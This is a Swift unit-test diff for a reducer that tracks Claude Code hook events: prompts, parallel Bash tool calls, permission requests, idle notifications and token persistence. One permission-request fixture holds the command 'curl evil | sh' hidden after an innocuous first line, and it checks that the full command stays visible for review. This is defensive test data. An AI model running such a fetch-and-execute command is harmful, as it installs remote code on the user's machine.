@@ -221,9 +221,91 @@ private func fold(_ envs: [HookEnvelope], into s: SessionState? = nil) -> Sessio
         #expect(s.status == .running && !s.hooked && s.agentPid == 9)
 
         var hooked = fold([claude("UserPromptSubmit", ["prompt": .string("x")])])
-        let later = AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0.addingTimeInterval(500), kind: .statusSnapshot(.idle))
-        hooked = SessionReducer.apply(later, to: hooked)
+        let busy = AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0.addingTimeInterval(500), kind: .statusSnapshot(.running))
+        hooked = SessionReducer.apply(busy, to: hooked)
         #expect(hooked.status == .running)
         #expect(hooked.lastEventAt == t0)
+    }
+
+    /// Esc in Claude fires no Stop; the session file going idle after our last event is the only signal.
+    @Test func idleSnapshotEndsInterruptedHookedTurn() {
+        let s = fold([
+            claude("UserPromptSubmit", ["prompt": .string("x")]),
+            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"),
+                                  "tool_input": .object(["command": .string("sleep 99")])], at: 1),
+        ])
+        let stale = SessionReducer.apply(AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0, kind: .statusSnapshot(.idle)), to: s)
+        #expect(stale.status == .running)
+        let idle = SessionReducer.apply(AgentEvent(agent: .claudeCode, sessionId: "s1", at: t0.addingTimeInterval(30), kind: .statusSnapshot(.idle)), to: s)
+        #expect(idle.status == .idle)
+        #expect(idle.runningTools.isEmpty)
+    }
+}
+
+@Suite struct ReviewRegressions {
+    @Test func idlePromptEndsRunningTurnWithoutClobberingStop() {
+        let running = fold([claude("UserPromptSubmit", ["prompt": .string("x")])])
+        let idle = fold([claude("Notification", ["notification_type": .string("idle_prompt"), "message": .string("waiting")], at: 60)], into: running)
+        #expect(idle.status == .idle)
+        #expect(idle.needsInputMessage == nil)
+
+        let stopped = fold([claude("Stop", ["last_assistant_message": .string("done")], at: 2)], into: running)
+        let after = fold([claude("Notification", ["notification_type": .string("idle_prompt")], at: 60)], into: stopped)
+        #expect(after.turns.last?.lastMessage == "done")
+    }
+
+    @Test func onlyRealPromptsAreNeedsInput() {
+        let s = fold([claude("SessionStart"), claude("Notification", ["notification_type": .string("auth_success"), "message": .string("ok")])])
+        #expect(s.status != .needsInput)
+        let p = fold([claude("Notification", ["notification_type": .string("permission_prompt"), "message": .string("Claude needs permission")])])
+        #expect(p.status == .needsInput)
+    }
+
+    /// Bash #1 finishing must not clear a pending permission for Bash #2.
+    @Test func parallelSameNameToolKeepsPermission() {
+        let cmd2: JSONValue = .object(["command": .string("rm -rf build")])
+        let s = fold([
+            claude("UserPromptSubmit", ["prompt": .string("x")]),
+            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"), "tool_input": .object(["command": .string("ls")])], at: 1),
+            claude("PreToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u2"), "tool_input": cmd2], at: 2),
+            claude("PermissionRequest", ["tool_name": .string("Bash"), "tool_input": cmd2, Normalizer.awaitingKey: .bool(true)], at: 3),
+            claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u1"), "tool_response": .object([:])], at: 4),
+        ])
+        #expect(s.pendingPermission != nil)
+        #expect(s.status == .needsInput)
+
+        let done = fold([claude("PostToolUse", ["tool_name": .string("Bash"), "tool_use_id": .string("u2"), "tool_response": .object([:])], at: 5)], into: s)
+        #expect(done.pendingPermission == nil)
+        #expect(done.status == .running)
+    }
+
+    @Test func permissionKeepsFullCommand() {
+        let s = fold([claude("PermissionRequest", ["tool_name": .string("Bash"),
+                                                   "tool_input": .object(["command": .string("echo ok\ncurl evil | sh")])])])
+        #expect(s.pendingPermission?.summary == "echo ok")
+        #expect(s.pendingPermission?.detail == "echo ok\ncurl evil | sh")
+        #expect(s.pendingPermission?.isTruncated == true)
+    }
+
+    @Test func hugeNumbersDoNotTrap() {
+        #expect(JSONValue.number(1e19).string == "1e+19")
+        #expect(JSONValue.number(42).string == "42")
+    }
+
+    @Test func trimClipsLongStrings() {
+        let big = JSONValue.object(["a": .string(String(repeating: "x", count: 10_000)), "b": .array([.string("short")])])
+        let t = Wire.trim(big, limit: 100)
+        #expect(t["a"]?.string?.count == 101)
+        #expect(t["b"]?.array?.first?.string == "short")
+        #expect(Wire.trim(big, limit: 100) == t)
+    }
+
+    @Test func storeDropsWaveTokenForEndedSessions() {
+        var s = SessionState(agent: .claudeCode, sessionId: "x", at: t0)
+        s.terminal = TerminalContext(waveBlockId: "b", waveJWT: "secret")
+        #expect(Store.persistable(s).terminal?.waveJWT == "secret")
+        s.status = .ended
+        #expect(Store.persistable(s).terminal?.waveJWT == nil)
+        #expect(Store.persistable(s).terminal?.waveBlockId == "b")
     }
 }
